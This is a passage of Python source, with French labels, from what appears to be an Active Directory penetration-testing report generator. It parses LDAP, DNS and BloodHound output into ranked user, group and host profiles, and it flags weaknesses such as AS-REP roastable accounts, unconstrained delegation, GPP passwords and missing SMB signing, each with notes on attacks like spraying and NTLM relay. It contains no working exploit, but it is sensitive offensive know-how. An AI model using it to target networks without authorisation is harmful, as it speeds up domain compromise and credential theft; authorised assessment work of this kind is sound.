                if entry.get("service"):
                    detail_bits.append(entry["service"])
                if entry.get("product"):
                    detail_bits.append(entry["product"])
                if entry.get("details"):
                    detail_bits.append(entry["details"][0])
                val = " | ".join(detail_bits)
                if entry["nonstandard"]:
                    val = (val + " | " if val else "") + "non standard"
                add("network", {"t": "ports", "label": entry["port"], "val": val})
            nonstd = [p for p in port_entries if p["nonstandard"]]
            if nonstd:
                add("network", {"t": "ports", "label": "Ports non standard", "val": " | ".join(f"{p['port']} {p['service'] or p['product']}".strip() for p in nonstd[:6])})
    hosts_f = out_dir / "hosts_discovery" / "discovered_hosts.txt"
    if hosts_f.exists():
        hosts = _lines(hosts_f, 5000)
        if hosts:
            add("network", {"t": "hosts", "label": f"{len(hosts)} hôtes découverts",
                            "val": " | ".join(hosts[:6])})
    finalize("network", "info")

    return cats


def _esc_desc(esc: str) -> str:
    desc = {
        "ESC1":  "Template: SAN contrôlé par le demandeur",
        "ESC2":  "Template: Any Purpose / SubCA",
        "ESC3":  "Template: Certificate Request Agent",
        "ESC4":  "Template: accès écriture sur le template",
        "ESC6":  "EDITF_ATTRIBUTESUBJECTALTNAME2 activé sur la CA",
        "ESC7":  "Accès Manage CA ou Manage Certificates",
        "ESC8":  "NTLM relay vers l'enrollment web AD CS",
        "ESC9":  "No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)",
        "ESC10": "Weak Certificate Mappings",
        "ESC11": "IF_ENFORCEENCRYPTICERTREQUEST désactivé",
        "ESC13": "OID Group Link (issuance policy)",
    }
    return desc.get(esc, "Vulnérabilité ADCS")


def collect_discovered_machines(out_dir: Path) -> list[dict]:
    machines: dict[str, dict] = {}

    def ensure(key: str, *, ip: str = "", host: str = "", source: str = "", info: str = "") -> None:
        if not key:
            return
        cur = machines.setdefault(key, {"ip": "", "host": "", "source": [], "info": []})
        if ip and not cur["ip"]:
            cur["ip"] = ip
        if host and not cur["host"]:
            cur["host"] = host
        if source and source not in cur["source"]:
            cur["source"].append(source)
        if info and info not in cur["info"]:
            cur["info"].append(info)

    def add_ip_host(ip: str = "", host: str = "", source: str = "", info: str = "") -> None:
        ip = ip.strip()
        host = host.strip().lower()
        key = host or ip
        ensure(key, ip=ip, host=host, source=source, info=info)

    hosts_map = out_dir / "hosts_discovery" / "hosts_map.txt"
    if hosts_map.exists():
        for line in safe_read_text(hosts_map, 20000).splitlines():
            line = line.strip()
            if not line:
                continue
            m = re.match(r"^(\S+)\s+->\s+(\S+)(?:\s+\(([^)]+)\))?", line)
            if m:
                add_ip_host(m.group(1), m.group(2), "hosts_map", m.group(3) or "")

    pairs = out_dir / "hosts_discovery" / "ip_host_pairs.tsv"
    if pairs.exists():
        for line in safe_read_text(pairs, 20000).splitlines():
            parts = [p.strip() for p in line.split("\t") if p.strip()]
            if len(parts) >= 2:
                add_ip_host(parts[0], parts[1], "ip_host_pairs", parts[2] if len(parts) > 2 else "")

    arp_f = out_dir / "hosts_discovery" / "arp_cache.txt"
    if arp_f.exists():
        for line in safe_read_text(arp_f, 12000).splitlines():
            ip = line.strip()
            if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", ip):
                add_ip_host(ip=ip, source="arp/neigh", info="Vu dans le cache voisinage")

    discovered = out_dir / "hosts_discovery" / "discovered_hosts.txt"
    if discovered.exists():
        for line in safe_read_text(discovered, 20000).splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = re.match(r"^(?:(\d{1,3}(?:\.\d{1,3}){3})\s+)?([A-Za-z0-9._-]+\.[A-Za-z0-9.-]+|\d{1,3}(?:\.\d{1,3}){3})(?:\s+\(([^)]+)\))?", line)
            if m:
                ip = m.group(1) or (m.group(2) if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", m.group(2)) else "")
                host = "" if ip == m.group(2) else m.group(2)
                add_ip_host(ip, host, "host_discovery", m.group(3) or "")

    ldap_comp = out_dir / "ldap_computers_auth.txt"
    if ldap_comp.exists():
        current_host = ""
        current_os = ""
        for line in safe_read_text(ldap_comp, 40000).splitlines():
            line = line.strip()
            if line.startswith("dNSHostName: "):
                if current_host:
                    add_ip_host(host=current_host, source="ldap", info=current_os)
                current_host = line.split(": ", 1)[1].strip()
                current_os = ""
            elif line.startswith("operatingSystem: "):
                current_os = line.split(": ", 1)[1].strip()
        if current_host:
            add_ip_host(host=current_host, source="ldap", info=current_os)

    ldapdump_computers = out_dir / "ldapdomaindump" / "domain_computers.json"
    if ldapdump_computers.exists():
        try:
            for entry in json.loads(ldapdump_computers.read_text()):
                attrs = entry.get("attributes", {}) or {}
                host = ""
                if attrs.get("dNSHostName"):
                    host = str(attrs["dNSHostName"][0]).strip()
                elif attrs.get("cn"):
                    host = str(attrs["cn"][0]).strip()
                info_bits = []
                if attrs.get("operatingSystem"):
                    info_bits.append(str(attrs["operatingSystem"][0]).strip())
                if attrs.get("sAMAccountName"):
                    info_bits.append(str(attrs["sAMAccountName"][0]).strip())
                if attrs.get("servicePrincipalName"):
                    info_bits.append(f"SPN:{str(attrs['servicePrincipalName'][0]).strip()}")
                add_ip_host(host=host, source="ldapdomaindump", info=" | ".join(info_bits))
        except Exception:
            pass

    for rel, source in (
        ("dns_enum/dc_a.txt", "dns"),
        ("dns_enum/srv_ldap_dc.txt", "dns"),
        ("dns_enum/srv_kerberos.txt", "dns"),
        ("dns_enum/host_srv_ldap.txt", "dns"),
        ("dns_enum/host_srv_kerberos.txt", "dns"),
    ):
        fp = out_dir / rel
        if not fp.exists():
            continue
        for line in safe_read_text(fp, 12000).splitlines():
            for ip in re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", line):
                add_ip_host(ip=ip, source=source, info=line[:120])
            for host in re.findall(r"\b[a-zA-Z0-9._-]+\.[a-zA-Z0-9.-]+\b", line):
                if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
                    add_ip_host(host=host, source=source, info=line[:120])

    loot_analysis_fp = out_dir / "parsed" / "loot_auto_analysis.json"
    if loot_analysis_fp.exists():
        try:
            loot_analysis = json.loads(loot_analysis_fp.read_text())
            for entry in ((loot_analysis.get("loot_intel") or {}).get("hosts") or []):
                if not isinstance(entry, dict):
                    continue
                add_ip_host(
                    ip=str(entry.get("ip", "") or "").strip(),
                    host=str(entry.get("host", "") or "").strip(),
                    source=str(entry.get("source", "loot_log")),
                    info=str(entry.get("info", "") or entry.get("evidence", "")).strip()[:160],
                )
        except Exception:
            pass

    results = []
    for item in machines.values():
        results.append({
            "ip": item["ip"],
            "host": item["host"],
            "source": " / ".join(item["source"][:3]),
            "info": " | ".join(item["info"][:3]),
        })
    results.sort(key=lambda x: (x["host"] or x["ip"] or ""))
    return results[:40]


def collect_user_profiles(out_dir: Path) -> list[dict]:
    users: dict[str, dict] = {}

    def ensure_user(name: str, allow_trailing_dollar: bool = False) -> dict | None:
        uname = (name or "").strip()
        if not uname or (uname.endswith("$") and not allow_trailing_dollar):
            return None
        return users.setdefault(uname, {
            "name": uname,
            "roles": [],
            "groups": [],
            "notes": [],
            "meta": {},
        })

    def first_value(value):
        if isinstance(value, list):
            return value[0] if value else None
        return value

    def set_meta(name: str, key: str, value, allow_trailing_dollar: bool = False) -> None:
        ent = ensure_user(name, allow_trailing_dollar=allow_trailing_dollar)
        if not ent:
            return
        val = first_value(value)
        if val in (None, "", [], {}):
            return
        sval = str(val).strip()
        if not sval:
            return
        ent["meta"][key] = sval

    def add_role(name: str, role: str) -> None:
        ent = ensure_user(name)
        if ent and role not in ent["roles"]:
            ent["roles"].append(role)

    def add_group(name: str, group: str) -> None:
        ent = ensure_user(name)
        if ent and group not in ent["groups"]:
            ent["groups"].append(group)

    def add_note(name: str, note: str) -> None:
        ent = ensure_user(name)
        if ent and note not in ent["notes"]:
            ent["notes"].append(note)

    # Seed from flat user lists
    for rel in ("users.txt", "users_ldap_auth.txt", "users_ldap.txt", "users_rpc.txt", "users_rpc_auth.txt", "users_smb.txt", "users_kerb.txt"):
        fp = out_dir / rel
        if not fp.exists():
            continue
        for ln in safe_read_text(fp, 30000).splitlines():
            ensure_user(ln.strip())

    # Focus files
    for rel, role in (
        ("ldap_admincount.txt", "AdminCount=1"),
        ("ldap_pwdneverexpires.txt", "Mot de passe non expirant"),
        ("ldap_asrep_candidates.txt", "AS-REP roastable"),
    ):
        fp = out_dir / rel
        if not fp.exists():
            continue
        for ln in safe_read_text(fp, 20000).splitlines():
            val = ln.strip()
            if val and not val.startswith("#"):
                add_role(val, role)

    kerb_fp = out_dir / "ldap_kerberoastable.txt"
    if kerb_fp.exists():
        current_user = ""
        spns: list[str] = []
        for raw in safe_read_text(kerb_fp, 60000).splitlines() + [""]:
            line = raw.strip()
            if line.startswith("sAMAccountName: "):
                if current_user:
                    add_role(current_user, "Kerberoastable")
                    if spns:
                        add_note(current_user, "SPN: " + " | ".join(spns[:2]))
                current_user = line.split(": ", 1)[1].strip()
                spns = []
            elif line.startswith("servicePrincipalName: "):
                spns.append(line.split(": ", 1)[1].strip())
        if current_user:
            add_role(current_user, "Kerberoastable")
            if spns:
                add_note(current_user, "SPN: " + " | ".join(spns[:2]))

    ldap_auth_fp = out_dir / "ldap_users_auth.txt"
    if ldap_auth_fp.exists():
        current_user = ""
        groups: list[str] = []
        for raw in safe_read_text(ldap_auth_fp, 120000).splitlines() + [""]:
            line = raw.strip()
            if line.startswith("sAMAccountName: "):
                if current_user:
                    for g in groups:
                        add_group(current_user, g)
                current_user = line.split(": ", 1)[1].strip()
                ensure_user(current_user)
                groups = []
            elif line.startswith("memberOf: "):
                g = line.split("CN=", 1)[-1].split(",", 1)[0].strip()
                if g:
                    groups.append(g)
                    gl = g.lower()
                    if any(k in gl for k in ("domain admins", "enterprise admins", "schema admins", "administrators", "dnsadmins", "account operators", "server operators", "backup operators", "print operators")):
                        add_role(current_user, g)
            elif current_user and line.startswith("userPrincipalName: "):
                set_meta(current_user, "upn", line.split(": ", 1)[1].strip())
            elif current_user and line.startswith("displayName: "):
                set_meta(current_user, "display", line.split(": ", 1)[1].strip())
            elif current_user and line.startswith("description: "):
                add_note(current_user, "Description: " + line.split(": ", 1)[1].strip())
        if current_user:
            for g in groups:
                add_group(current_user, g)

    ldapdump_users = out_dir / "ldapdomaindump" / "domain_users.json"
    if ldapdump_users.exists():
        try:
            for entry in json.loads(ldapdump_users.read_text()):
                attrs = entry.get("attributes", {}) or {}
                name = ((attrs.get("sAMAccountName") or attrs.get("cn") or [None])[0] or "").strip()
                if not name:
                    continue
                allow_dollar = name.endswith("$")
                ensure_user(name, allow_trailing_dollar=allow_dollar)
                set_meta(name, "display", attrs.get("displayName"), allow_trailing_dollar=allow_dollar)
                set_meta(name, "upn", attrs.get("userPrincipalName"), allow_trailing_dollar=allow_dollar)
                set_meta(name, "mail", attrs.get("mail"), allow_trailing_dollar=allow_dollar)
                set_meta(name, "title", attrs.get("title"), allow_trailing_dollar=allow_dollar)
                set_meta(name, "pwd_last_set", attrs.get("pwdLastSet"), allow_trailing_dollar=allow_dollar)
                set_meta(name, "last_logon", attrs.get("lastLogon"), allow_trailing_dollar=allow_dollar)
                if attrs.get("userAccountControl"):
                    try:
                        uac = int(first_value(attrs.get("userAccountControl")))
                        flags = []
                        if uac & 0x2:
                            flags.append("désactivé")
                        else:
                            flags.append("activé")
                        if uac & 0x10000:
                            flags.append("mot de passe non expirant")
                        if uac & 0x400000:
                            flags.append("compte pré-auth désactivée")
                        if flags:
                            set_meta(name, "uac", ", ".join(flags), allow_trailing_dollar=allow_dollar)
                    except Exception:
                        pass
                if attrs.get("adminCount") and str(attrs["adminCount"][0]).strip() == "1":
                    add_role(name, "AdminCount=1")
                if attrs.get("servicePrincipalName"):
                    add_role(name, "Compte de service / SPN")
                    spn = str(attrs["servicePrincipalName"][0]).strip()
                    if spn:
                        add_note(name, "SPN: " + spn)
                if attrs.get("userPrincipalName"):
                    add_note(name, "UPN: " + str(attrs["userPrincipalName"][0]).strip())
                if attrs.get("memberOf"):
                    vals = attrs["memberOf"]
                    for item in vals[:8]:
                        g = str(item).split("CN=", 1)[-1].split(",", 1)[0].strip()
                        if g:
                            add_group(name, g)
                            gl = g.lower()
                            if any(k in gl for k in ("domain admins", "enterprise admins", "schema admins", "administrators", "dnsadmins", "account operators", "server operators", "backup operators", "print operators", "it")):
                                add_role(name, g)
                if attrs.get("description"):
                    add_note(name, "Description: " + str(attrs["description"][0]).strip())
        except Exception:
            pass

    bh_dir = out_dir / "bloodhound"
    if bh_dir.exists():
        latest_users = sorted(
            [p for p in bh_dir.glob("*_users.json") if p.stat().st_size > 0],
            key=lambda p: p.stat().st_mtime,
            reverse=True,
        )
        if latest_users:
            try:
                obj = json.loads(latest_users[0].read_text())
                for entry in obj.get("data", []) or []:
                    props = entry.get("Properties", {}) or {}
                    raw_name = (props.get("samaccountname") or props.get("name") or "").strip()
                    if not raw_name:
                        continue
                    name = raw_name.split("@", 1)[0]
                    allow_dollar = name.endswith("$")
                    ensure_user(name, allow_trailing_dollar=allow_dollar)
                    set_meta(name, "display", props.get("displayname"), allow_trailing_dollar=allow_dollar)
                    set_meta(name, "upn", props.get("name"), allow_trailing_dollar=allow_dollar)
                    set_meta(name, "description", props.get("description"), allow_trailing_dollar=allow_dollar)
                    set_meta(name, "pwd_last_set", props.get("pwdlastset"), allow_trailing_dollar=allow_dollar)
                    set_meta(name, "last_logon", props.get("lastlogon"), allow_trailing_dollar=allow_dollar)
                    if props.get("enabled") is not None:
                        set_meta(name, "enabled", "oui" if bool(props.get("enabled")) else "non", allow_trailing_dollar=allow_dollar)
                    if props.get("dontreqpreauth"):
                        add_role(name, "AS-REP roastable")
                    if props.get("hasspn"):
                        add_role(name, "Compte de service / SPN")
                    spns = props.get("serviceprincipalnames") or []
                    if spns:
                        add_note(name, "SPN: " + " | ".join(map(str, spns[:3])))
                    if props.get("unconstraineddelegation"):
                        add_role(name, "Unconstrained Delegation")
                    if props.get("admincount"):
                        add_role(name, "AdminCount=1")
            except Exception:
                pass

    def score(user: dict) -> tuple[int, int, str]:
        role_score = 0
        for role in user["roles"]:
            rl = role.lower()
            if any(k in rl for k in ("domain admins", "enterprise admins", "schema admins", "administrators")):
                role_score += 50
            elif any(k in rl for k in ("admincount", "dnsadmins", "account operators", "server operators", "backup operators")):
                role_score += 30
            elif any(k in rl for k in ("kerberoastable", "as-rep", "mot de passe non expirant", "service")):
                role_score += 15
            else:
                role_score += 8
        role_score += len(user["groups"])
        return (-role_score, user["name"].lower().count("."), user["name"].lower())

    result = []
    for user in sorted(users.values(), key=score):
        meta = user.get("meta", {})
        meta_lines = []
        for label, key in (
            ("Affichage", "display"),
            ("UPN", "upn"),
            ("Email", "mail"),
            ("Titre", "title"),
            ("Activé", "enabled"),
            ("Statut", "uac"),
            ("Dernier logon", "last_logon"),
            ("Dernier changement MDP", "pwd_last_set"),
        ):
            if meta.get(key):
                meta_lines.append(f"{label}: {meta[key]}")
        if meta.get("description"):
            meta_lines.append(f"Description: {meta['description']}")
        result.append({
            "name": user["name"],
            "roles": user["roles"][:10],
            "groups": user["groups"][:12],
            "notes": (meta_lines + user["notes"])[:12],
        })
    return result


def collect_group_profiles(out_dir: Path) -> list[dict]:
    groups: dict[str, dict] = {}

    def ensure_group(name: str) -> dict | None:
        gname = (name or "").strip()
        if not gname:
            return None
        return groups.setdefault(gname, {
            "name": gname,
            "roles": [],
            "notes": [],
            "members": [],
        })

    def add_role(name: str, role: str) -> None:
        ent = ensure_group(name)
        if ent and role not in ent["roles"]:
            ent["roles"].append(role)

    def add_note(name: str, note: str) -> None:
        ent = ensure_group(name)
        if ent and note not in ent["notes"]:
            ent["notes"].append(note)

    def add_member(name: str, member: str) -> None:
        ent = ensure_group(name)
        if ent and member and member not in ent["members"]:
            ent["members"].append(member)

    sensitive_keywords = (
        "domain admins", "enterprise admins", "schema admins", "administrators",
        "dnsadmins", "account operators", "server operators", "backup operators",
        "print operators", "group policy creator owners", "cert publishers",
        "protected users", "key admins", "enterprise key admins", "it",
    )

    ldapdump_groups = out_dir / "ldapdomaindump" / "domain_groups.json"
    if ldapdump_groups.exists():
        try:
            for entry in json.loads(ldapdump_groups.read_text()):
                attrs = entry.get("attributes", {}) or {}
                name = ((attrs.get("sAMAccountName") or attrs.get("cn") or [None])[0] or "").strip()
                if not name:
                    continue
                ensure_group(name)
                lower_name = name.lower()
                if any(k in lower_name for k in sensitive_keywords):
                    add_role(name, "Groupe sensible")
                if attrs.get("description"):
                    add_note(name, "Description: " + str(attrs["description"][0]).strip())
                members = attrs.get("member") or []
                for raw_member in members[:12]:
                    member = str(raw_member)
                    if "CN=" in member:
                        member = member.split("CN=", 1)[1].split(",", 1)[0].strip()
                    add_member(name, member)
                if members:
                    add_note(name, f"Membres recensés: {len(members)}")
        except Exception:
            pass

    bh_dir = out_dir / "bloodhound"
    if bh_dir.exists():
        latest_groups = sorted(
            [p for p in bh_dir.glob("*_groups.json") if p.stat().st_size > 0],
            key=lambda p: p.stat().st_mtime,
            reverse=True,
        )
        if latest_groups:
            try:
                obj = json.loads(latest_groups[0].read_text())
                for entry in obj.get("data", []) or []:
                    props = entry.get("Properties", {}) or {}
                    raw_name = (props.get("samaccountname") or props.get("name") or "").strip()
                    if not raw_name:
                        continue
                    name = raw_name.split("@", 1)[0]
                    ensure_group(name)
                    lower_name = name.lower()
                    if props.get("highvalue"):
                        add_role(name, "HighValue BloodHound")
                    if props.get("admincount"):
                        add_role(name, "AdminCount=1")
                    if any(k in lower_name for k in sensitive_keywords):
                        add_role(name, "Groupe sensible")
                    if props.get("description"):
                        add_note(name, "Description: " + str(props["description"]).strip())
                    members = entry.get("Members") or []
                    if members:
                        add_note(name, f"Membres BloodHound: {len(members)}")
            except Exception:
                pass

    def score(group: dict) -> tuple[int, str]:
        role_score = 0
        for role in group["roles"]:
            rl = role.lower()
            if "highvalue" in rl:
                role_score += 40
            elif "groupe sensible" in rl:
                role_score += 30
            elif "admincount" in rl:
                role_score += 20
            else:
                role_score += 10
        role_score += min(len(group["members"]), 15)
        return (-role_score, group["name"].lower())

    result = []
    for group in sorted(groups.values(), key=score):
        result.append({
            "name": group["name"],
            "roles": group["roles"][:8],
            "members": group["members"][:12],
            "notes": group["notes"][:8],
            "member_count": len(group["members"]),
        })
    return result


def collect_directory_anomalies(out_dir: Path) -> list[dict]:
    findings: list[dict] = []

    def add(title: str, path: str = "", severity: str = "medium", why: str = "", impact: str = "", evidence: str = "") -> None:
        if not title:
            return
        entry = {
            "text": title.strip(),
            "title": title.strip(),
            "path": path,
            "severity": severity,
            "why": why.strip(),
            "impact": impact.strip(),
            "evidence": evidence.strip(),
        }
        if entry not in findings:
            findings.append(entry)

    policy_json = out_dir / "ldapdomaindump" / "domain_policy.json"
    if policy_json.exists():
        try:
            obj = json.loads(policy_json.read_text())
            attrs = (obj[0].get("attributes", {}) if isinstance(obj, list) and obj else {}) or {}
            maq = str((attrs.get("ms-DS-MachineAccountQuota") or [None])[0] or "").strip()
            if maq.isdigit() and int(maq) > 0:
                add(
                    f"MachineAccountQuota = {maq}",
                    "ldapdomaindump/domain_policy.json",
                    "high",
                    "Le domaine autorise encore la création de comptes machine par des utilisateurs standards.",
                    "RBCD, ajout de machine et chemins d'élévation basés sur un faux compte ordinateur deviennent crédibles.",
                    "ms-DS-MachineAccountQuota > 0",
                )
            lockout = str((attrs.get("lockoutThreshold") or [None])[0] or "").strip()
            if lockout.isdigit() and int(lockout) == 0:
                add(
                    "Aucun verrouillage de compte",
                    "ldapdomaindump/domain_policy.json",
                    "high",
                    "La politique de domaine ne semble pas verrouiller les comptes après échecs d'authentification.",
                    "Password spray et validation de creds nettement moins risqués.",
                    "lockoutThreshold = 0",
                )
        except Exception:
            pass

    ldap_passpol = out_dir / "ldap_passpol.txt"
    if ldap_passpol.exists():
        txt = safe_read_text(ldap_passpol, 12000)
        min_len = re.search(r"minPwdLength:\s+(\d+)", txt)
        if min_len and int(min_len.group(1)) < 10:
            add(
                f"Longueur minimale des mots de passe = {min_len.group(1)}",
                "ldap_passpol.txt",
                "medium",
                "La politique mot de passe est permissive.",
                "Le brute force ciblé, le spray ou le crack offline ont plus de chances d'aboutir.",
            )
        hist = re.search(r"pwdHistoryLength:\s+(\d+)", txt)
        if hist and int(hist.group(1)) < 10:
            add(
                f"Historique des mots de passe faible ({hist.group(1)})",
                "ldap_passpol.txt",
                "low",
                "Le domaine conserve peu d'anciens mots de passe.",
                "Les réutilisations et variations de mots de passe deviennent plus plausibles.",
            )
        lockout = re.search(r"lockoutThreshold:\s+(\d+)", txt)
        if lockout and int(lockout.group(1)) == 0:
            add(
                "Aucun verrouillage de compte détecté dans la politique LDAP",
                "ldap_passpol.txt",
                "high",
                "Le verrouillage n'est pas activé côté LDAP non plus.",
                "Le spray mot de passe reste une piste à faible coût opérationnel.",
            )

    users_json = out_dir / "ldapdomaindump" / "domain_users.json"
    if users_json.exists():
        try:
            users = json.loads(users_json.read_text())
            counts = {
                "asrep": 0,
                "pwd_no_exp": 0,
                "spn": 0,
                "admincount": 0,
                "desc_secret": 0,
            }
            desc_hits: list[str] = []
            for entry in users:
                attrs = entry.get("attributes", {}) or {}
                try:
                    uac = int((attrs.get("userAccountControl") or [0])[0] or 0)
                except Exception:
                    uac = 0
                if uac & 0x400000:
                    counts["asrep"] += 1
                if uac & 0x10000:
                    counts["pwd_no_exp"] += 1
                if attrs.get("servicePrincipalName"):
                    counts["spn"] += 1
                if str((attrs.get("adminCount") or [0])[0]).strip() == "1":
                    counts["admincount"] += 1
                desc = str((attrs.get("description") or [""])[0] or "").strip()
                if desc and re.search(r"(pass(word)?|pwd|secret|credential|creds?)", desc, re.IGNORECASE):
                    counts["desc_secret"] += 1
                    sam = str((attrs.get("sAMAccountName") or attrs.get("cn") or ["?"])[0])
                    desc_hits.append(f"{sam}: {desc[:80]}")
            if counts["asrep"]:
                add(
                    f"{counts['asrep']} compte(s) sans pré-auth Kerberos",
                    "ldapdomaindump/domain_users.json",
                    "high",
                    "Des comptes utilisateurs peuvent demander un AS-REP sans preuve de connaissance du mot de passe.",
                    "AS-REP roasting possible puis crack offline sans bruit d'authentification interactive.",
                )
            if counts["pwd_no_exp"]:
                add(
                    f"{counts['pwd_no_exp']} compte(s) avec mot de passe non expirant",
                    "ldapdomaindump/domain_users.json",
                    "medium",
                    "Les secrets de ces comptes risquent d'être stables dans le temps.",
                    "Un mot de passe récupéré peut rester valable longtemps et servir de pivot durable.",
                )
            if counts["spn"]:
                add(
                    f"{counts['spn']} compte(s) de service / SPN",
                    "ldapdomaindump/domain_users.json",
                    "medium",
                    "Le domaine expose des comptes de service identifiables.",
                    "Kerberoast possible avec credentials valides, puis crack offline.",
                )
            if counts["admincount"]:
                add(
                    f"{counts['admincount']} compte(s) AdminCount=1",
                    "ldapdomaindump/domain_users.json",
                    "medium",
                    "Ces objets sont souvent ou ont été protégés / sensibles.",
                    "Ils méritent une revue ACL, groupes et chemins d'attaque prioritaires.",
                )
            if counts["desc_secret"]:
                add(
                    f"{counts['desc_secret']} description(s) utilisateur contiennent des mots-clés secrets/password",
                    "ldapdomaindump/domain_users.json",
                    "high",
                    "Les champs description exposent potentiellement des secrets opérationnels ou indices de mot de passe.",
                    "Peut donner des creds directs, conventions de mots de passe ou pivots métier.",
                )
                for item in desc_hits[:2]:
                    add(
                        f"Description sensible",
                        "ldapdomaindump/domain_users.json",
                        "high",
                        "Un contenu de description mérite une revue manuelle immédiate.",
                        "Potentiel credential leak ou indice de mot de passe.",
                        item,
                    )
        except Exception:
            pass

    groups_json = out_dir / "ldapdomaindump" / "domain_groups.json"
    if groups_json.exists():
        try:
            groups = json.loads(groups_json.read_text())
            for entry in groups:
                attrs = entry.get("attributes", {}) or {}
                name = str((attrs.get("sAMAccountName") or attrs.get("cn") or [""])[0] or "").strip()
                members = attrs.get("member") or []
                if name.lower() in {"domain admins", "enterprise admins", "administrators"} and len(members) > 5:
                    add(
                        f"Groupe privilégié '{name}' avec {len(members)} membres",
                        "ldapdomaindump/domain_groups.json",
                        "medium",
                        "Le périmètre d'administration semble large.",
                        "Davantage de comptes à surveiller, plus de chances de compromission indirecte.",
                    )
        except Exception:
            pass

    computers_json = out_dir / "ldapdomaindump" / "domain_computers.json"
    if computers_json.exists():
        try:
            computers = json.loads(computers_json.read_text())
            unconstrained = []
            for entry in computers:
                attrs = entry.get("attributes", {}) or {}
                try:
                    uac = int((attrs.get("userAccountControl") or [0])[0] or 0)
                except Exception:
                    uac = 0
                if uac & 0x80000:
                    host = str((attrs.get("dNSHostName") or attrs.get("cn") or ["?"])[0] or "?")
                    unconstrained.append(host)
            if unconstrained:
                add(
                    f"{len(unconstrained)} machine(s) en délégation non contrainte",
                    "ldapdomaindump/domain_computers.json",
                    "high",
                    "Ces hôtes peuvent stocker des tickets réutilisables si l'on y force ou observe une authentification.",
                    "Capture TGT, élévation et pivot AD très intéressants.",
                    ", ".join(unconstrained[:3]),
                )
        except Exception:
            pass

    gpp_hits = out_dir / "attack_checks" / "gpp_hits.txt"
    if gpp_hits.exists():
        lines = [ln.strip() for ln in safe_read_text(gpp_hits, 8000).splitlines() if ln.strip()]
        if lines:
            add(
                f"GPP / cpassword détecté ({len(lines)} hit(s))",
                "attack_checks/gpp_hits.txt",
                "critical",
                "Des secrets GPP sont exposés dans SYSVOL ou des artefacts liés.",
                "Peut donner des credentials réutilisables quasi immédiatement.",
                lines[0][:120],
            )

    shares_signing = out_dir / "attack_checks" / "smb_signing_check.txt"
    if shares_signing.exists():
        txt = safe_read_text(shares_signing, 4000)
        if re.search(r"signing[:=]\s*false|disabled|not required", txt, re.IGNORECASE):
            add(
                "SMB signing non requis",
                "attack_checks/smb_signing_check.txt",
                "high",
                "Les protections anti-relay SMB ne sont pas imposées.",
                "NTLM relay et certains pivots coercition deviennent beaucoup plus réalistes.",
            )

    relay_hints = out_dir / "relay_hints" / "ntlm_relay_commands.txt"
    if relay_hints.exists() and relay_hints.stat().st_size > 0:
        add(
            "Des commandes de NTLM relay ont déjà été préparées",
            "relay_hints/ntlm_relay_commands.txt",
            "medium",
            "Le loot a déjà identifié des cibles ou modes de relay plausibles.",
            "Tu peux passer rapidement de l'énumération à l'abus NTLM relay.",
        )

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    findings.sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("text", "")))
    return findings[:16]


def collect_bloodhound_auto_review(out_dir: Path) -> list[dict]:
    bh_dir = out_dir / "bloodhound"
    if not bh_dir.exists():
        return []

    review: list[dict] = []

    def add(text: str, path: str = "", severity: str = "medium") -> None:
        if not text:
            return
        entry = {"text": text.strip(), "path": path, "severity": severity}
        if entry not in review:
            review.append(entry)

    latest_zip = sorted([p for p in bh_dir.glob("*.zip") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
    users_files = sorted([p for p in bh_dir.glob("*_users.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
    groups_files = sorted([p for p in bh_dir.glob("*_groups.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
    computers_files = sorted([p for p in bh_dir.glob("*_computers.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
    domains_files = sorted([p for p in bh_dir.glob("*_domains.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)

    if latest_zip:
        add(f"ZIP BloodHound prêt à l'import : {latest_zip[0].name}.", f"bloodhound/{latest_zip[0].name}", "low")

    if users_files:
        try:
            obj = json.loads(users_files[0].read_text())
            data = obj.get("data", []) or []
            highvalue = []
            kerberoast = []
            asrep = []
            unconstrained = []
            admincount = []
            for entry in data:
                props = entry.get("Properties", {}) or {}
                name = (props.get("samaccountname") or props.get("name") or "?").split("@", 1)[0]
                if props.get("highvalue"):
                    highvalue.append(name)
                if props.get("hasspn"):
                    kerberoast.append(name)
                if props.get("dontreqpreauth"):
                    asrep.append(name)
                if props.get("unconstraineddelegation"):
                    unconstrained.append(name)
                if props.get("admincount"):
                    admincount.append(name)
            if highvalue:
                add(f"BloodHound : {len(highvalue)} compte(s) HighValue, ex. {', '.join(highvalue[:4])}.", f"bloodhound/{users_files[0].name}", "high")
            if kerberoast:
                add(f"BloodHound : {len(kerberoast)} compte(s) avec SPN / Kerberoast, ex. {', '.join(kerberoast[:4])}.", f"bloodhound/{users_files[0].name}", "medium")
            if asrep:
                add(f"BloodHound : {len(asrep)} compte(s) AS-REP roastable, ex. {', '.join(asrep[:4])}.", f"bloodhound/{users_files[0].name}", "high")
            if unconstrained:
                add(f"BloodHound : délégation non contrainte sur {', '.join(unconstrained[:3])}.", f"bloodhound/{users_files[0].name}", "high")
            if admincount:
                add(f"BloodHound : {len(admincount)} compte(s) AdminCount=1.", f"bloodhound/{users_files[0].name}", "medium")
        except Exception:
            pass

    if groups_files:
        try:
            obj = json.loads(groups_files[0].read_text())
            data = obj.get("data", []) or []
            high_groups = []
            for entry in data:
                props = entry.get("Properties", {}) or {}
                name = (props.get("samaccountname") or props.get("name") or "?").split("@", 1)[0]
                if props.get("highvalue"):
                    high_groups.append(name)
            if high_groups:
                add(f"BloodHound : groupes HighValue détectés, ex. {', '.join(high_groups[:4])}.", f"bloodhound/{groups_files[0].name}", "high")
        except Exception:
            pass

    if computers_files:
        try:
            obj = json.loads(computers_files[0].read_text())
            data = obj.get("data", []) or []
            unconstrained = []
            constrained = []
            for entry in data:
                props = entry.get("Properties", {}) or {}
                name = (props.get("samaccountname") or props.get("name") or "?").split("@", 1)[0]
                if props.get("unconstraineddelegation"):
                    unconstrained.append(name)
                if props.get("allowedtodelegate"):
                    constrained.append(name)
            if unconstrained:
